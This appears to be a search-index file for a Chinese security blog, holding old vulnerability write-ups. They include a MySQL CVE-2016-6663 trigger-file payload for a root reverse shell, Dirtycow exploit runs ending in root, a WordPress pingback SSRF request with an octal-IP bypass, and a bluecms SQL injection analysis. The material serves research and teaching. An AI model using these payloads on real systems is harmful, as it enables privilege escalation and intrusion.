{"config":{"lang":["en","ja"],"separator":"[\\s\\u200b\\-]","pipeline":["stemmer"]},"docs":[{"location":"","title":"Home","text":""},{"location":"#tag:java","title":"Java","text":"<ul> <li>            JNDI with LDAP          </li> <li>            JNDI with RMI          </li> <li>            Java\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6316\u6398\u4e4bCommonsCollections1          </li> <li>            Java\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6316\u6398\u4e4bCommonsCollections2,4,8          </li> <li>            Java\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6316\u6398\u4e4bCommonsCollections3          </li> <li>            Java\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6316\u6398\u4e4bCommonsCollections5,6,7,9,10          </li> <li>            Java\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6316\u6398\u4e4bShiro\u53cd\u5e8f\u5217\u5316          </li> <li>            Struts2\u547d\u4ee4\u6267\u884c\u5404\u7248\u672c\u8bb0\u5f55          </li> <li>            Thymeleaf ssti 3.1.2 \u9ed1\u540d\u5355\u7ed5\u8fc7          </li> <li>            XStream 1.4.15 Blacklist Bypass          </li> <li>            struts2\u5386\u53f2\u6f0f\u6d1e\u5206\u6790          </li> <li>            \u3010tabby \u6848\u4f8b\u968f\u7b14\u3011XML-RPC RCE CVE-2023-49070          </li> <li>            \u3010tabby \u6848\u4f8b\u968f\u7b14\u3011sysaid CVE-2023-47246          </li> <li>            \u56de\u987eXStream\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e          </li> <li>            \u57fa\u4e8e\u4ee3\u7801\u5c5e\u6027\u56fe\u7684\u81ea\u52a8\u5316\u6f0f\u6d1e\u6316\u6398\u5b9e\u8df5          </li> <li>            \u5982\u4f55\u9ad8\u6548\u5730\u6361\u6f0f\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\uff1f          </li> <li>            \u5982\u4f55\u9ad8\u6548\u7684\u6316\u6398Java\u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\uff1f          </li> <li>            \u653b\u51fbJava JMX-RMI          </li> <li>            \u6d45\u8c08Java RMI Registry\u5b89\u5168\u95ee\u9898          </li> <li>            \u6d45\u8c08fastjson\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e          </li> </ul>"},{"location":"#tag:ctf","title":"ctf","text":"<ul> <li>            DDCTF 2018 web writeup          </li> <li>            HITB-XCTF 2018 web writeup          </li> <li>            SUCTF 2018 \u90e8\u5206web writeup          </li> <li>            Thymeleaf ssti 3.1.2 \u9ed1\u540d\u5355\u7ed5\u8fc7          </li> <li>            python sandbox escape          </li> <li>            xnuca2020 easyjava\u8bbe\u8ba1\u601d\u8def          </li> </ul>"},{"location":"#tag:\u6f0f\u6d1e\u5206\u6790","title":"\u6f0f\u6d1e\u5206\u6790","text":"<ul> <li>            CVE-2016-5195 Dirtycow          </li> <li>            DM\u4f01\u4e1a\u5efa\u7ad9\u7cfb\u7edf\u524d\u53f0\u76f2\u6ce8          </li> <li>            MYSQL\u63d0\u6743\u5206\u6790          </li> <li>            MovieGuide v2.0 SQLi          </li> <li>            bluecms v1.6 Sql Injection \u5206\u6790          </li> <li>            mycncart sqli          </li> <li>            seacms v6.5 \u524d\u53f0getshell          </li> <li>            temmoku home\u7248 t1.15 \u524d\u53f0sqli          </li> <li>            thinkphp v5.2.x \u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6316\u6398          </li> <li>            thinkphp v5.x App.php s\u53c2\u6570RCE          </li> <li>            thinkphp v6.0.x \u53cd\u5e8f\u5217\u5316\u5229\u7528\u94fe\u6316\u6398          </li> <li>            wordpress SSRF &lt;4.5          </li> </ul>"},{"location":"about/","title":"About Me","text":"<p>A program analysis enthusiasts \ud83d\ude04</p> <p>A researcher on java code review (semi-auto and manual) and redteam \ud83e\udd14</p> <p>A former ctfer at NeSE \ud83c\udf75</p> <p>And currently work on MYbank \ud83d\udc1c</p> <p>You can reach me with [wh1t3p1g#gmail.com]</p>"},{"location":"about/#open-source-tools","title":"Open Source Tools","text":"<ul> <li>ysomap: A helpful Java Deserialization Exploit Framework.</li> <li>tabby: A CAT called tabby ( Code Analysis Tool ).</li> <li>tabby-path-finder: A neo4j procedure for tabby.</li> <li>tabby-vul-finder: A tool for tabby to load CPG and find vulnerabilities automatically.</li> <li>tabby-intellij-plugin: A plugin for tabby and IDEA.</li> </ul>"},{"location":"blog/2016/old-cve-2016-6663-mysql-exp/","title":"MYSQL\u63d0\u6743\u5206\u6790","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-cve-2016-6663-mysql-exp/#_1","title":"\u6982\u8ff0","text":"<p>\u51e0\u5929\u524d\u51fa\u4e86mysql\u672c\u5730\u63d0\u6743\u76840day\uff0c\u867d\u7136\u73b0\u5728\u5b98\u65b9\u5df2\u7ecf\u51fa\u4e86\u8865\u4e01\uff0c\u4f46\u662f\u53d7\u5f71\u54cd\u7684\u4e3b\u673a\u8fd8\u662f\u633a\u591a\u7684\u3002\u8ddf\u8fdb\u64cd\u4f5c\u4e00\u904d\uff1a\uff09</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-cve-2016-6663-mysql-exp/#_2","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<pre><code>MySQL  &lt;= 5.7.15       \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c/ \u63d0\u6743 (0day)\n        5.6.33\n        5.5.52\n\nMysql\u5206\u652f\u7684\u7248\u672c\u4e5f\u53d7\u5f71\u54cd,\u5305\u62ec\uff1a\n    MariaDB\n    PerconaDB\n</code></pre>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-cve-2016-6663-mysql-exp/#_3","title":"\u5b9e\u9a8c\u5206\u6790","text":"<p>\u8fd9\u6b21\u5b9e\u9a8c\u4e3b\u8981\u4f7f\u7528docker\u642d\u5efa\u73af\u5883\uff0c\u6709\u9700\u8981\u7684\u540c\u5b66\u53ef\u4ee5pull\u6211\u7684\u5e93\u73a90kami/vulenv:cve-2016-6663 \u5b9e\u9a8c\u4e3b\u8981\u4eceattacker\u7684\u89d2\u5ea6\u5165\u624b\uff0c\u9884\u5148\u62e5\u6709\u7684\u6743\u9650\uff1a <pre><code>mysql \u8d26\u6237\u62e5\u6709file\u6743\u9650 bob/bob\nexp mysql_hookandroot_lib.c\nmysql-server-5.6\nmy.cnf\u53ef\u88abmysql\u7ec4\u6539\u5199\u5199\n</code></pre></p> <p>\u5148\u67e5\u770b\u4e00\u4e0b\u7248\u672c\u4fe1\u606f  \u5c06<code>/etc/mysql/my.cnf</code>\u6743\u9650\u4fee\u6539\u6389  \u521b\u5efabob\u7528\u6237\uff0c\u5e76\u8d4b\u4e88file\uff0cselect\uff0cinsert\u6743\u9650\uff0c\u521b\u5efa\u7528\u4e8e\u5b9e\u9a8c\u7684\u6570\u636e\u5e93activedb\u548c\u8868active_table   \u5c06exp\u5148\u5199\u5165tmp\u76ee\u5f55\uff0c\u5e76\u7f16\u8bd1\u6210so\u6587\u4ef6\uff0c\u9700\u8981\u4fee\u6539\u4e00\u4e0bip\uff0cport\u548cmy.cnf\u7684\u4f4d\u7f6e  <code>gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.c.so mysql_hookandroot_lib.c.c -ldl</code>  \u6700\u540e\u4e00\u6b65\u5c31\u662f\u51c6\u5907\u4e00\u4e0bactive_table\u7684\u89e6\u53d1\u5668\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u73b0\u5728\u81ea\u5df1\u7535\u8111\u4e0aroot\u7528\u6237\u6743\u9650\u4e0b\u751f\u6210\u4e00\u4e2atragger  \u5728activedb\u6570\u636e\u4e0b\u4f1a\u751f\u6210\u4e00\u4e2a\u89e6\u53d1\u5668  \u5230\u6b64\u4f4d\u7f6e\u6211\u4eec\u6240\u6709\u7684\u51c6\u5907\u5de5\u4f5c\u90fd\u505a\u597d\u4e86\u3002\u8ba9\u6211\u4eec\u7528bob\u7528\u6237\u6765\u5f39\u4e2ashell\u5427 <pre><code>select \"TYPE=TRIGGERS\\ntriggers='CREATE DEFINER=`root`@`localhost` TRIGGER active_table\\nAFTER INSERT\\n   ON `active_table` FOR EACH ROW\\nBEGIN\\n   DECLARE void varchar(550);\\n   set global general_log_file=\\\\\\'/etc/mysql/my.cnf\\\\\\';\\n   set global general_log = on;\\n   select \\\"\\n[mysqld]\\nmalloc_lib=\\\\\\'/tmp/mysql_hookandroot_lib.so\\\\\\'\\n\\\" INTO void;   \\n   set global general_log = off;\\nEND'\\nsql_modes=1073741824\\ndefiners='root@localhost'\\nclient_cs_names='latin1'\\nconnection_cl_names='latin1_swedish_ci'\\ndb_cl_names='latin1_swedish_ci'\" into dumpfile '/var/lib/mysql/activedb/active_table.TRG';\n</code></pre> \u7528bob\u7684\u7528\u6237\u5199\u5165\u6587\u4ef6\u4ea7\u751f\u4e00\u4e2a\u89e6\u53d1\u5668\uff0c\u8fd9\u4e2a\u89e6\u53d1\u5668\u5f53\u4ea7\u751finsert\u65f6\u89e6\u53d1  \u6765\u67e5\u770b\u4e00\u4e0b\uff0c\u6267\u884c\u540e\u7684<code>/etc/mysql/my.cnf</code>\u7684\u5185\u5bb9  \u91cd\u542f\u4e00\u4e0b\u6570\u636e\u5e93\uff0c\u53cd\u5f39\u4e00\u4e2ashell \u53d1\u73b0\u53ef\u5199\u7684my.cnf\u4f1a\u88ab\u5ffd\u7565\uff1f\uff1f\uff1f\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\uff08\u96be\u9053\u6253\u8865\u4e01\u4e86\uff1f\uff09\uff0c\u4e0d\u77e5\u90535.5\u7684\u60c5\u51b5\u4f1a\u600e\u4e48\u6837\uff0c\u6240\u4ee5\u5148\u628amy.cnf\u7684\u6743\u9650\u6539\u56de\u6765744   \u6210\u529f\u53cd\u5f39\u4e00\u4e2ashell\uff0c\u8fd9\u8fb9\u8fd4\u56de\u7684\u4e00\u4e2ashell\u662fmysql\u6743\u9650\u7684 \u662f\u56e0\u4e3a\u6211\u6d4b\u8bd5\u7684\u73af\u5883mysqld_safe\u662f\u4ee5mysql\u6743\u9650\u8fd0\u884c\u7684\uff0c\u6240\u4ee5\u5f39\u51fa\u6765\u7684\u6743\u9650\u662fmysql\u7684\uff0c\u4f46\u662f\u5982\u679cmysqld_safe\u662f\u4ee5root\u6743\u9650\u8fd0\u884c\uff0c\u90a3\u4e48\u53cd\u5f39\u7684shell\u5c31\u662froot\u6743\u9650\u7684\uff0c\u9020\u6210\u63d0\u6743\u3002</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-cve-2016-6663-mysql-exp/#_4","title":"\u603b\u7ed3","text":"<p>\u6d4b\u8bd5\u73af\u5883\u642d\u5efa\u8fd8\u6709\u5229\u7528\u8fc7\u7a0b\u8fd8\u662f\u51fa\u73b0\u4e86\u5f88\u591a\u95ee\u9898\uff0c\u53ef\u5199\u7684my.cnf\u4f1a\u88ab\u5ffd\u7565\u8f7d\u5165\uff08\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u56e0\u4e3a\u4fee\u590d\u8fc7\u7684\u539f\u56e0\uff09\uff0ctriggers\u7684\u5229\u7528\uff08\u53ef\u4ee5\u540c\u6837\u5229\u7528\u5728\u62e5\u6709file\u6743\u9650\u7684\u60c5\u51b5\u4e0b\u63d0\u5347\u6743\u9650\uff0c\u8fd9\u4e2a\u5230\u65f6\u5019\u518d\u6df1\u5165\u5b66\u4e60\u4e00\u4e0b\uff09</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-dirtycow-cve-2016-5195/","title":"CVE-2016-5195 Dirtycow","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-dirtycow-cve-2016-5195/#_1","title":"\u6982\u8ff0","text":"<p>\u6700\u8fd1\u51fa\u6765\u7684dirtycow\uff0c\u5f71\u54cd\u7248\u672c:Linux kernel &gt;= 2.6.22\uff082007\u5e74\u53d1\u884c\uff0c\u5230\u4eca\u5e7410\u670818\u65e5\u624d\u4fee\u590d\uff09,\u7528\u7f51\u4e0a\u7684EXP\u8bd5\u4e86\u4e00\u4e0b\uff0c\u8bb0\u5f55\u4e00\u4e0b\u8fc7\u7a0b</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-dirtycow-cve-2016-5195/#exp","title":"EXP","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-dirtycow-cve-2016-5195/#httpswwwexploit-dbcomexploits40616","title":"https://www.exploit-db.com/exploits/40616/","text":"<p>\u8fd9\u4e2aEXP\u662fexploitdb\u4e0a\u7684\uff0c\u4f46\u662f\u5bb9\u6613\u9020\u6210\u7cfb\u7edf\u5d29\u6e83\uff0c\u6210\u529f\u540e\u4f1a\u8fd4\u56de\u4e00\u4e2aroot\u6743\u9650\u7684shell</p> <pre><code>okami@ubuntu14:~$ ./dirtycow\nDirtyCow root privilege escalation\nBacking up /usr/bin/passwd.. to /tmp/bak\nSize of binary: 47032\nRacing, this may take a while..\nthread stopped\nthread stopped\n/usr/bin/passwd is overwritten\nPopping root shell.\nDon't forget to restore /tmp/bak\nroot@ubuntu14:/home/okami# id\nuid=0(root) gid=1000(okami) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(okami)\nroot@ubuntu14:/home/okami# whoami\nroot\nroot@ubuntu14:/home/okami#\n</code></pre>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-dirtycow-cve-2016-5195/#httpsgithubcomscumjrdirtycow-vdso","title":"https://github.com/scumjr/dirtycow-vdso","text":"<p>\u8fd9\u4e2aEXP\u4e0d\u4f1a\u51fa\u73b0\u7cfb\u7edf\u5d29\u6e83\uff0c\u4f46\u662f\u4f5c\u8005\u672c\u4eba\u8bf4\u4e0d\u9002\u7528\u4e8e\u6240\u6709linux\u7248\u672c\uff0c\u4e0d\u8fc7\u8bd5\u9a8c\u4e86\u4e00\u4e0b\uff0cubuntu14 16 centOS7\u90fd\u53ef\u4ee5 <pre><code>okami@ubuntu14:~$ ./0xdeadbeef\n[*] exploit: patch 1/2\n[*] vdso successfully backdoored\n[*] exploit: patch 2/2\n[*] vdso successfully backdoored\n[*] waiting for reverse connect shell...\n[*] enjoy!\n[*] restore: patch 2/2\n[*] vdso successfully restored\n[*] restore: patch 1/2\n[*] vdso successfully restored\nid\nuid=0(root) gid=0(root) groups=0(root)\nwhoami\nroot\nlsb_release -a\nNo LSB modules are available.\nDistributor ID: Ubuntu\nDescription:    Ubuntu 14.04.5 LTS\nRelease:    14.04\nCodename:   trusty\n</code></pre> \u6ce8\u610f\u8fd9\u91cc\u6709\u4e00\u6b65\u662fwaiting for reverse connect shell...\uff0c\u9700\u8981\u4e00\u70b9\u65f6\u95f4\uff0c\u6210\u529f\u540e\u6709root\u6743\u9650\u7684shell</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/","title":"wordpress SSRF <4.5","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/#_1","title":"\u6982\u8ff0","text":"<p>\u524d\u51e0\u5929\uff0cwordpress\u7206\u51fa\u4e00\u4e2aSSRF\u7684\u6f0f\u6d1e\uff0c\u8ddf\u8fdb\u4e00\u4e0b\uff0c\u67e5\u9605\u4e86\u4e00\u4e0b\uff0c\u7f51\u4e0a\u5e76\u6ca1\u6709\u8be6\u7ec6\u7684\u5229\u7528\u65b9\u5f0f\u3002\u4ee5\u524d\u4e5f\u6ca1\u600e\u4e48\u63a5\u89e6\u8fc7wordpress\uff0c\u770b\u4e86\u4e00\u4e0b\u53d7\u5f71\u54cd\u7684\u4ee3\u7801\uff0c\u8bb0\u5f55\u4e00\u4e0b\u8fc7\u7a0b\u3002</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/#ip","title":"ip\u5730\u5740\u7684\u51e0\u79cd\u8868\u793a\u65b9\u5f0f","text":"<p>ip\u5730\u5740\u57df\u540d\u6709\u591a\u79cd\u8868\u793a\u65b9\u5f0f\uff0c\u6d4f\u89c8\u5668\u90fd\u80fd\u8bc6\u522b\u51fa\u6765\u3002</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/#ip_1","title":"\u5e38\u89c1\u7684ip\u5730\u5740\u57df\u540d\u8868\u793a\u65b9\u6cd5","text":"<ul> <li>\u70b9\u5206\u5341\u8fdb\u5236\u8868\u793a\u6cd5\uff0c\u4f8b\u5982192.168.1.2</li> <li>\u4e8c\u8fdb\u5236\u8868\u793a\u6cd5\u4f8b\u598211000000101010000000000100000010\uff0c\u8868\u793a192.168.1.2</li> </ul>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/#ip_2","title":"\u975e\u5e38\u89c1ip\u5730\u5740\u57df\u540d\u8868\u793a\u65b9\u6cd5","text":"<ul> <li>\u6574\u6570\u578b\uff1a\u5c06\u4e0a\u8ff0\u7684\u4e8c\u8fdb\u5236\u76f4\u63a5\u8f6c\u6362\u6210\u6574\u65703232235778\uff0c\u6d4f\u89c8\u5668\u901a\u8fc7\u8bbf\u95eehttp://3232235778 \u89e3\u6790\u4e3a192.168.1.2\uff0c\u9664\u6b64\u4e4b\u5916\u8fd8\u53ef\u4ee5\u901a\u8fc7\u516c\u5f0f<code>192*256^3+168*256^2+1*256+2=3232235778</code>\u6362\u7b97</li> <li>\u516b\u8fdb\u5236\u578b\uff1a\u5c06IP 192.168.1.2\u6362\u62108\u8fdb\u52360300.0250.01.02\uff0c\u5728\u524d\u9762\u52a0\u4e0a0\u8868\u793a8\u8fdb\u5236</li> <li>\u5341\u516d\u8fdb\u5236\u578b\uff1a\u5c06IP 192.168.1.2\u6362\u621016\u8fdb\u52360xc0.0xA8.1.2\uff0c\u5728\u524d\u9762\u52a0\u4e0a0x\u8868\u793a16\u8fdb\u5236</li> <li>\u6df7\u5408\u578b\uff1a\u5373\u4ee5\u4e0a\u7684\u51e0\u79cd\u65b9\u5f0f\u7684\u7ed3\u5408\uff0c0300.0xA8.1.0x02</li> </ul> <p>\u4e0b\u9762\u5c31\u662f\u901a\u8fc7\u516b\u8fdb\u5236\u7ed5\u8fc7\u68c0\u6d4b\u3002</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/#_2","title":"\u4ee3\u7801\u8be6\u60c5","text":"<p>\u6f0f\u6d1e\u6210\u56e0\u5904508 <code>wp_http_validate_url</code> \u51fd\u6570 <pre><code>......\nif ( ! $same_host ) {\n        $host = trim( $parsed_url['host'], '.' );\n        if ( preg_match( '#^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$#', $host ) ) {\n            $ip = $host;\n        } else {\n            $ip = gethostbyname( $host );\n            if ( $ip === $host ) // Error condition for gethostbyname()\n                $ip = false;\n        }\n        if ( $ip ) {\n            $parts = array_map( 'intval', explode( '.', $ip ) );\n            if ( 127 === $parts[0] || 10 === $parts[0] || 0 === $parts[0]\n                || ( 172 === $parts[0] &amp;&amp; 16 &lt;= $parts[1] &amp;&amp; 31 &gt;= $parts[1] )\n                || ( 192 === $parts[0] &amp;&amp; 168 === $parts[1] )\n            ) {\n        ......\n</code></pre> \u8fd9\u91cc\u7684\u4ee3\u7801\u901a\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f<code>^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$</code>\u5224\u65adip\u662f\u5426\u5408\u6cd5\uff0c\u5982\u679c\u4e0d\u5408\u6cd5\u5219\u901a\u8fc7\u7f51\u7edc\u83b7\u53d6ip\u7684\u503c\u3002 \u4e0b\u9762\u7684if\u5224\u65ad\u5219\u662f\u7528\u6765\u9632\u6b62\u7ed9\u7684url\u4e3a\u5185\u7f51ip\uff0c\u4f46\u662f\u4e0a\u8ff0\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u53ef\u4ee5\u901a\u8fc78\u8fdb\u5236\u7ed5\u8fc7\u5185\u7f51\u9650\u5236\u3002 <pre><code>if ( empty( $parsed_url['port'] ) )\n        return $url;\n\n    $port = $parsed_url['port'];\n    if ( 80 === $port || 443 === $port || 8080 === $port )\n        return $url;\n</code></pre> \u518d\u63a5\u4e0b\u6765\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u53c8\u5bf9\u7aef\u53e3\u505a\u4e86\u9650\u5236\uff0c\u53ea\u80fd\u626b\u63cf80,443,8080\u7aef\u53e3\u3002 \u7efc\u4e0a\u6240\u8ff0\uff0c\u901a\u8fc78\u8fdb\u5236\u7ed5\u8fc7ip\u5224\u65ad\uff0c\u53ef\u4ee5\u626b\u63cf\u5185\u7f51\u768480,443,8080 \u627e\u4e00\u4e0b\u8c03\u7528\u7684\u4f4d\u7f6e,\u53ef\u4ee5\u627e\u5230class-wp-xmlrpc-server.php\u901a\u8fc7wp_safe_remote_get\u8c03\u7528\u4e86get\u51fd\u6570\uff0cget\u51fd\u6570\u4f7f\u7528\u4e86wp_http_validate_url\uff0c\u4ece\u800c\u9020\u6210ssrf</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/#_3","title":"\u5229\u7528","text":"<p>\u5229\u7528\u7684\u65b9\u5f0f\u4e3a\u901a\u8fc7xmlrpc.php\u4e2dpingback.ping\u529f\u80fd\u6765\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u3002 POC <pre><code>POST /cms/wordpress/wp442/xmlrpc.php HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 321\n\n&lt;?xml version=\"1.0\" encoding=\"iso-8859-1\"?&gt;\n&lt;methodCall&gt;\n&lt;methodName&gt;pingback.ping&lt;/methodName&gt;\n&lt;params&gt;\n&lt;param&gt;&lt;value&gt;&lt;string&gt;http://012.10.10.111:8080/testvul&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://localhost/cms/wordpress/wp442/2016/08/19/hello-world/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\n&lt;/params&gt;\n&lt;/methodCall&gt;\n</code></pre> \u8fd9\u91cc\u8bbe\u7f6e10.10.10.111\u4e3a\u53d7\u5bb3\u8005 </p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/#_4","title":"\u603b\u7ed3","text":"<p>\u5728\u6d4b\u8bd5\u4e2d\u53d1\u73b0\u53ea\u80fd\u5bf910.x.x.x\u7684\u5185\u7f51ip\u8fdb\u884c\u5229\u7528\uff0c\u56e0\u4e3a\u6b63\u5219\u7684\u539f\u56e0\u81f3\u591a\u53ea\u80fd\u67093\u4f4d\u6570\u5b57\uff0c\u4e00\u4f4d\u9700\u8981\u4e3a0\u6765\u8868\u793a8\u8fdb\u5236\uff0c\u6240\u4ee5\u5229\u7528\u53ea\u670910,\u5e76\u4e14\u53ea\u80fd\u626b\u63cf80,443,8080\u7aef\u53e3\u3002\u7531\u4e8e\u5229\u7528\u4e2d\u4e0d\u56de\u663e\uff0c\u4e5f\u5f88\u96be\u786e\u5b9a\u662f\u5426\u6210\u529f\u5229\u7528\u3002\u6240\u4ee5\u8fd9\u4e2a\u6d1e\u53ef\u80fd\u5371\u5bb3\u6bd4\u8f83\u5c0f\uff08\u592a\u83dc\u4e86\uff0c\u60f3\u4e0d\u5230\u5176\u4ed6\u7684\u5229\u7528\u65b9\u5f0f\uff0c\u6709\u5176\u4ed6\u7684\u5229\u7528\u65b9\u5f0f\u8bb0\u5f97\u5206\u4eab\u554a\uff01\uff01\uff01\uff09 \u8fd8\u6709\u4e00\u79cd\u5229\u7528\u5c31\u662f\u5f00\u542fxmlrpc\u7684wordpress\u7ad9\u53ef\u4ee5\u88ab\u901a\u8fc7pingback.ping\u65b9\u6cd5\u6765DDOS\uff0c\u8fd9\u4e2a\u4ee5\u524d\u5c31\u6709\u4eba\u63d0\u51fa\u6765\u4e86\u3002</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2016/old-wordpress-ssrf-4-4-2/#_5","title":"\u53c2\u8003","text":"<p>http://xlab.baidu.com/wordpress/ https://virusdefender.net/index.php/archives/733/</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/","title":"bluecms v1.6 Sql Injection \u5206\u6790","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/#_1","title":"\u6982\u8ff0","text":"<p>\u5f88\u4e45\u6ca1\u6709\u4ee3\u7801\u5ba1\u8ba1\u4e86\uff0c\u62ff\u4e00\u5957\u7b80\u5355\u7684\u627e\u627e\u611f\u89c9\u3002bluecms\u662f\u4e00\u5957\u6bd4\u8f83\u8001\u7684\u95e8\u6237\u7f51\u7ad9cms\uff0c\u7f51\u4e0a\u4e5f\u6709\u5f88\u591a\u5173\u4e8e\u5b83\u7684\u6f0f\u6d1e\u8fd8\u672a\u4fee\u8865\uff0c\u6240\u4ee5\u4e0b\u6587\u7684\u6f0f\u6d1e\u4e5f\u4e0d\u7b97\u662f\u6700\u65b0\u7684\uff0c\u4ec5\u5f53\u662f\u7ec3\u7ec3\u624b\u3002</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/#sql","title":"SQL\u6ce8\u5165\u5206\u6790","text":"<p>\u9996\u5148\u5173\u6ce8\u4e00\u4e0b\u6570\u636e\u7684\u8f93\u5165</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/#_2","title":"\u5168\u5c40\u6570\u636e\u8f6c\u4e49","text":"<p>\u5728common.inc.php\u4e2d</p> <p><pre><code>if(!get_magic_quotes_gpc())\n{\n    $_POST = deep_addslashes($_POST);\n    $_GET = deep_addslashes($_GET);\n    $_COOKIES = deep_addslashes($_COOKIES);\n    $_REQUEST = deep_addslashes($_REQUEST);\n}\n</code></pre> \u518d\u8ddf\u8fdb\u4e00\u4e0bdeep_addslashes</p> <p><pre><code>function deep_addslashes($str)\n{\n    if(is_array($str))\n    {\n        foreach($str as $key=&gt;$val)\n        {\n            $str[$key] = deep_addslashes($val);\n        }\n    }\n    else\n    {\n        $str = addslashes($str);\n    }\n    return $str;\n}\n</code></pre> \u53ef\u4ee5\u53d1\u73b0\u5bf9\u6570\u636e\u7684\u6ce8\u5165\uff0c\u8fdb\u884c\u4e86\u52a0\u659c\u6760\u8f6c\u4e49\u7684\u64cd\u4f5c\u3002\u90a3\u4e48\u63a5\u4e0b\u6765\u627e\u6ce8\u5165\u601d\u8def\u4e3b\u8981\u6709\u4ee5\u4e0b3\u70b9\uff1a</p> <ol> <li>\u627e\u6574\u6570\u578b\u6ce8\u5165</li> <li>\u6574\u5957cms\u9ed8\u8ba4gb2312\u7f16\u7801\uff0c\u5bb9\u6613\u9020\u6210\u5bbd\u5b57\u8282\u6ce8\u5165</li> <li>http\u5934\u5e76\u4e0d\u5728\u8f6c\u4e49\u7684\u8303\u56f4\u5185\uff0c\u6240\u4ee5\u7c7b\u4f3c\u5b58\u5165ip\uff0creffer\u7684\u4f4d\u7f6e\u4e5f\u80fd\u53d1\u751f\u6ce8\u5165</li> </ol>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2017/bluecms-v1-6-Sql-Injection/#_3","title":"\u6574\u6570\u578b\u6ce8\u5165","text":"<p>\u62ffgrep\u5339\u914d\u4e86\u4e00\u4e0b$_GET\uff0c\u627e\u5230\u4e00\u5904\u4e0d\u505a\u5176\u4ed6\u8fc7\u6ee4\u7684\u6574\u6570\u578b\u4f4d\u7f6e</p> <pre><code>./ad_js.php:$ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : '';\n</code></pre> <p>\u8ddf\u8fdbad_js.php</p> <p><pre><code>$ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : '';\nif(empty($ad_id))\n{\n    echo 'Error!';\n    exit();\n}\n\n$ad = $db-&gt;getone(\"SELECT * FROM \".table('ad').\" WHERE ad_id =\".$ad_id);\n</code></pre> getone\u51fd\u6570</p> <pre><code>function getone($sql, $type=MYSQL_ASSOC){\n        $query = $this-&gt;query($sql,$this-&gt;linkid);\n        $row = mysql_fetch_array($query, $type);\n        return $row;\n}\n</code></pre> 